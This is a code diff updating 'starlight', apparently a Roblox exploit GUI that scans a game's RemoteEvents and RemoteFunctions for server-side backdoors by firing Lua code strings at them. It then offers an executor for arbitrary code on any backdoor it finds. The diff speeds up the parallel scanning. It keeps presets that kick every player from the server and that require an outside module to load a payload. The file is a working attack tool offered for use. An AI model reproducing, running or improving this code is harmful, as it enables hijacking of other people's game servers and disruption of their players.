@@ -1,5 +1,5 @@
 -- starlight 💫
--- 0.1.72
+-- 0.1.8
 
 
 
@@ -751,7 +751,7 @@ Converted["_ImageLabel7"].Size = UDim2.new(0, 35, 0, 35)
 Converted["_ImageLabel7"].Parent = Converted["_Logs1"]
 
 Converted["_Version"].Font = Enum.Font.SourceSans
-Converted["_Version"].Text = "0.1.72"
+Converted["_Version"].Text = "0.1.8"
 Converted["_Version"].TextColor3 = Color3.fromRGB(255, 255, 255)
 Converted["_Version"].TextScaled = true
 Converted["_Version"].TextSize = 14
@@ -965,25 +965,7 @@ local function UVRY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.c.L
 		button.BackgroundColor3 = Color3.fromRGB(10,10,10)
 		button.UIStroke.Color = Color3.fromRGB(50,50,50)
 	end)
-	button.MouseButton1Up:Connect(function()
-		button.BackgroundColor3 = Color3.fromRGB(16,16,16)
-		button.UIStroke.Color = Color3.fromRGB(57,57,57)
-	end)
 	button.MouseButton1Click:Connect(function()
-		local tweenService = game:GetService("TweenService")
-		local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
-		local transparencyGoal = {BackgroundTransparency = 1}
-	
-		for _, obj in pairs(frame:GetDescendants()) do
-			if obj:IsA("GuiObject") then
-				tweenService:Create(obj, tweenInfo, transparencyGoal):Play()
-				if obj:IsA("TextLabel") or obj:IsA("TextButton") then
-					tweenService:Create(obj, tweenInfo, {TextTransparency = 1}):Play()
-				end
-			end
-		end
-	
-		task.wait(0.3)
 		frame:Destroy()
 	end)
 end
@@ -1173,124 +1155,169 @@ local function CXGRFXR_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	local userInputService = game:GetService("UserInputService")
 	local runService = game:GetService("RunService")
 	local tweenService = game:GetService("TweenService")
-	local HttpService = game:GetService("HttpService")
-	local Players = game:GetService("Players")
-	local LocalPlayer = Players.LocalPlayer
-	local gui = script.Parent
-	
-	local RunService = game:GetService("RunService")
-	local excludedRemotes = {
-		"UpdateCurrentCall",
-		"CanChatWith",
-		"OnNewMessage",
-		"OnMessageDoneFiltering",
-		"OnChannelJoined",
-		"OnNewSystemMessage",
-		"NewPlayerGroupDetails"
-	}
-	local foundExploit = false
-	local remoteEvent, remoteFunction
-	local FinishedFound = false
-	local function testRemote(remote, isFunction)
-		if foundExploit then return end
-		local randomId = tostring(math.random(1, 999))
-		local modelName = "starlight_" .. randomId
-		print("💫 starlight: checking Remote:", remote.Name)
-	
-		local foundEvent = false
-		local function onAdded(instance)
-			if instance.Name == modelName then
-				foundEvent = true
-			end
-		end
-	
-		local connection = workspace.DescendantAdded:Connect(onAdded)
-		if isFunction then
-			pcall(function()
-				remote:InvokeServer([[local m=Instance.new("Folder") m.Name="]] .. modelName .. [[" m.Parent=workspace]])
-			end)
-		else
-			remote:FireServer([[local m=Instance.new("Folder") m.Name="]] .. modelName .. [[" m.Parent=workspace]])
-		end
-	
-		local startTime = tick()
-		while tick() - startTime < 1 do
-			if foundEvent or workspace:FindFirstChild(modelName, true) then
-				foundEvent = true
-				break
-			end
-			RunService.Heartbeat:Wait()
-		end
-	
-		connection:Disconnect()
-		if foundEvent then
-			print("💫 starlight: backdoor found!")
-			foundExploit = true
-			if isFunction then
-				remoteFunction = remote
-			else
-				remoteEvent = remote
-			end
-		else
-			print("💫 starlight: remote not backdoor:", remote.Name)
-		end
-	end
-	script.Parent.Sidebar.Presets.MouseButton1Click:Connect(function()
-		script.Parent.Framee.Visible = false
-		script.Parent.Presets.Visible = true
-		script.Parent.Logs.Visible = false
-	end)
-	script.Parent.Presets.Polaria.MouseButton1Click:Connect(function()
-		script.Parent.Framee.TextBox.Text = 'require(123255432303221):Pload("' .. game.Players.LocalPlayer.Name ..  '")'
-		script.Parent.Framee.Visible = true
-		script.Parent.Presets.Visible = false
-		script.Parent.Logs.Visible = false
-	end)
-	script.Parent.Presets.Shutdown.MouseButton1Click:Connect(function()
-		script.Parent.Framee.TextBox.Text = 'for _, player in pairs(game.Players:GetPlayers()) do player:Kick("The server has shutdown.") end'
-		script.Parent.Framee.Visible = true
-		script.Parent.Presets.Visible = false
-		script.Parent.Logs.Visible = false
-	end)
-	script.Parent.Sidebar.Logs.MouseButton1Click:Connect(function()
-		script.Parent.Framee.Visible = false
-		script.Parent.Logs.Visible = true
-		script.Parent.Presets.Visible = false
-	end)
-	script.Parent.Sidebar.Executor.MouseButton1Click:Connect(function()
-		script.Parent.Framee.Visible = true
-		script.Parent.Logs.Visible = false
-		script.Parent.Presets.Visible = false
-	end)
-	
-	local function findRemote()
-		local remotes = {}
-		for _, remote in ipairs(game:GetDescendants()) do
-			if (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) and not table.find(excludedRemotes, remote.Name) then
-				table.insert(remotes, remote)
-			end
-		end
-	
-		for _, remote in ipairs(remotes) do
-			task.spawn(function()
-				if not foundExploit then
-					testRemote(remote, remote:IsA("RemoteFunction"))
-				end
-			end)
-		end
-	
-		local overallTimeout = 5.5
-		local start = tick()
-		repeat task.wait(0.3) until foundExploit or (tick() - start > overallTimeout)
-		FinishedFound = true -- Marking when the search is done
-		if remoteEvent then
-			print("💫 starlight: using backdoor (RemoteEvent):", remoteEvent:GetFullName())
-		elseif remoteFunction then
-			print("💫 starlight: using backdoor (RemoteFunction):", remoteFunction:GetFullName())
-		else
-			print("💫 starlight: no Backdoor found.")
-		end
-	end
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+-- Lightning-fast exclusion system
+local EXCLUDED_REMOTES = {
+    UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
+    OnMessageDoneFiltering = true, OnChannelJoined = true, OnNewSystemMessage = true,
+    NewPlayerGroupDetails = true, ClientLoaded = true, SetPlayerReady = true,
+    SetCoreGuiEnabled = true, SetCore = true, DispatchEvent = true,
+    PromptGamePassPurchaseFinished = true, PromptPurchaseFinished = true,
+    PromptSubscriptionFinished = true, InspectMenuFromMouse = true,
+    GetServerVersion = true, GetClientId = true, GetInventory = true,
+    GetFriends = true, GetAccountInfo = true, RequestServerSaves = true,
+    UpdatePlayerBlockList = true, SetAvatarBlockList = true,
+    SetFriendRequestEvent = true, NewFollower = true, PerformAction = true,
+    ReportAbuse = true
+}
+
+-- Cache safe locations
+local SAFE_LOCATIONS = {
+    ["CoreGui"] = true,
+    ["ServerStorage"] = true,
+    ["ReplicatedFirst"] = true,
+    ["ServerScriptService"] = true
+}
+
+local foundExploit = false
+local FinishedFound = false
+local remoteEvent, remoteFunction
+local scanTime = 0
+
+local function isLikelyBackdoorRemote(remote)
+    local name = remote.Name
+    local parent = remote.Parent
+    
+    -- Ultra-fast checks in order of speed:
+    -- 1. Check parent location first (fastest)
+    if SAFE_LOCATIONS[parent.ClassName] then
+        return false
+    end
+    
+    -- 2. Check excluded names
+    if EXCLUDED_REMOTES[name] then
+        return false
+    end
+
+    
+    return true
+end
+
+local function testRemote(remote, isFunction)
+    if foundExploit then return false end
+    if not isLikelyBackdoorRemote(remote) then return end
+    local modelName = "starlight_"..tostring(os.clock()):gsub("%.", "")
+    local foundEvent = false
+    
+    -- Lightweight connection
+    local connection = game.ReplicatedStorage.DescendantAdded:Connect(function(instance)
+        if instance.Name == modelName then
+            foundEvent = true
+        end
+    end)
+
+    -- Turbo test with minimal waits
+    local startTime = os.clock()
+    local success = pcall(function()
+        if isFunction then
+            remote:InvokeServer('starlight_check', [[
+                local m=Instance.new("Folder")
+                m.Name="]]..modelName..[["
+                m.Parent=game.ReplicatedStorage
+                return true
+            ]])
+        else
+            remote:FireServer([[
+                local m=Instance.new("Folder")
+                m.Name="]]..modelName..[["
+                m.Parent=game.ReplicatedStorage
+            ]])
+        end
+    end)
+
+    -- Rapid checking (16 checks max)
+    for _ = 1, 16 do
+        if foundEvent or game.ReplicatedStorage:FindFirstChild(modelName) then
+            foundEvent = true
+            break
+        end
+        task.wait(0.05) -- Minimal wait
+    end
+
+    -- Instant cleanup
+    connection:Disconnect()
+    if foundEvent then
+        local instance = game.ReplicatedStorage:FindFirstChild(modelName)
+        if instance then instance:Destroy() end
+        
+        foundExploit = true
+        if isFunction then
+            remoteFunction = remote
+        else
+            remoteEvent = remote
+        end
+        return true
+    end
+    return false
+end
+
+local function findRemote()
+    local trueStart = os.clock()
+    foundExploit = false
+    remoteEvent = nil
+    remoteFunction = nil
+    
+    -- Blazing-fast remote collection
+    local remotes = {}
+    local count = 0
+    for _, remote in ipairs(game:GetDescendants()) do
+        if (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
+            count += 1
+            remotes[count] = remote
+            print(string.format("  \x1b💫 starlight: [%d] Scanning: %s\x1b", count, remote:GetFullName()))
+        end
+    end
+
+    print(string.format("💫 starlight: 🔍 scanning %d remotes", count))
+    
+    -- Warp-speed parallel scanning
+    local MAX_CONCURRENT = 16 -- Increased concurrency
+    local activeTasks = 0
+    local taskDone = Instance.new("BindableEvent")
+
+    for i = 1, count do
+        if foundExploit then break end
+        
+        -- Minimal waiting for task slots
+        while activeTasks >= MAX_CONCURRENT do
+            taskDone.Event:Wait(0.02) -- Ultra-short wait
+        end
+
+        activeTasks += 1
+        task.spawn(function()
+            if testRemote(remotes[i], remotes[i]:IsA("RemoteFunction")) then
+                print(string.format("\x1b💫 starlight:  backdoor found: %s\x1b", remotes[i]:GetFullName()))
+            end
+            activeTasks -= 1
+            taskDone:Fire()
+        end)
+    end
+
+    -- Final wait (minimal)
+    while activeTasks > 0 and not foundExploit do
+        taskDone.Event:Wait(0.02)
+    end
+
+    scanTime = os.clock() - trueStart
+    	FinishedFound = true
+    if not foundExploit then
+        print("\x1b💫 starlight: no backdoor found\x1b")
+    end
+
+    print(string.format("💫 starlight: scan completed in \x1b%.3f seconds\x1b", scanTime))
+end
 	
 	local function fireRemoteEvent(code)
 		if remoteEvent then
@@ -1324,7 +1351,33 @@ local function CXGRFXR_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			})
 		end
 	end
-	
+		script.Parent.Sidebar.Presets.MouseButton1Click:Connect(function()
+		script.Parent.Framee.Visible = false
+		script.Parent.Presets.Visible = true
+		script.Parent.Logs.Visible = false
+	end)
+	script.Parent.Presets.Polaria.MouseButton1Click:Connect(function()
+		script.Parent.Framee.TextBox.Text = 'require(123255432303221):Pload("' .. game.Players.LocalPlayer.Name ..  '")'
+		script.Parent.Framee.Visible = true
+		script.Parent.Presets.Visible = false
+		script.Parent.Logs.Visible = false
+	end)
+	script.Parent.Presets.Shutdown.MouseButton1Click:Connect(function()
+		script.Parent.Framee.TextBox.Text = 'for _, player in pairs(game.Players:GetPlayers()) do player:Kick("The server has shutdown.") end'
+		script.Parent.Framee.Visible = true
+		script.Parent.Presets.Visible = false
+		script.Parent.Logs.Visible = false
+	end)
+	script.Parent.Sidebar.Logs.MouseButton1Click:Connect(function()
+		script.Parent.Framee.Visible = false
+		script.Parent.Logs.Visible = true
+		script.Parent.Presets.Visible = false
+	end)
+	script.Parent.Sidebar.Executor.MouseButton1Click:Connect(function()
+		script.Parent.Framee.Visible = true
+		script.Parent.Logs.Visible = false
+		script.Parent.Presets.Visible = false
+	end)
 	game.StarterGui:SetCore("SendNotification",{
 		Title = "💫 starlight",
 		Text = "discord server: https://discord.gg/sCwubxMJ9z",
@@ -1340,7 +1393,6 @@ local function CXGRFXR_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		script.Parent.Framee.Check.Visible = true
 		script.Parent.stat.ImageColor3 = Color3.fromRGB(255, 184, 71)
 	
-		task.wait(0.8)
 		task.spawn(findRemote)
 	
 		repeat task.wait() until FinishedFound or remoteEvent or remoteFunction
@@ -1353,7 +1405,7 @@ local function CXGRFXR_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
 			game.StarterGui:SetCore("SendNotification",{
 				Title = "💫 starlight",
-				Text = "backdoor found! backdoor: " .. remoteEvent.Name,
+				Text = "backdoor found in " .. scanTime .."s! backdoor: " .. remoteEvent.Name,
 				Duration = 5
 			})
 		else
